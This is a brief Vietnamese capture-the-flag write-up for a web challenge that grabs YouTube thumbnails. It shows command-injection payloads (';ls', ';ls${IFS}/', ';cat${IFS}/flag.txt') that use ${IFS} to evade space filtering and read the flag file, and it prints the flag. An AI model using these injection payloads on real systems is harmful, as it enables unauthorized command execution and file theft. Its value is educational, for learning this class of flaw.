Đây là chương trình lấy ảnh youtube bằng link, thử cung cấp 1 url

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/3386aab7-6cfc-472c-90da-e956018c3e67)

Có vẻ đây là 1 lệnh linux sử dụng thư viện `youtube-dl`

Thêm dấu ngắt lệnh `;ls`

Tên file `index.php` được trả về

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/419a53d1-1f39-4744-9573-4e751c7fc11e)

Kiểm tra thư mục `/`, thấy có file `flag.txt`

```
;ls${IFS}/
```

`${IFS}` là ký tự khoảng trắng trong shell

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/4d2b0355-6874-4301-b0e6-2cd14ebbadf2)

Đọc flag:

```
;cat${IFS}/flag.txt
```

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/41c70a25-5623-4eb6-b947-e1c32180a49b)

```CHH{Ea5y_cOmmaND_inj3c7Ion_48a3fb378305a9dab79569e3060df5cc}```
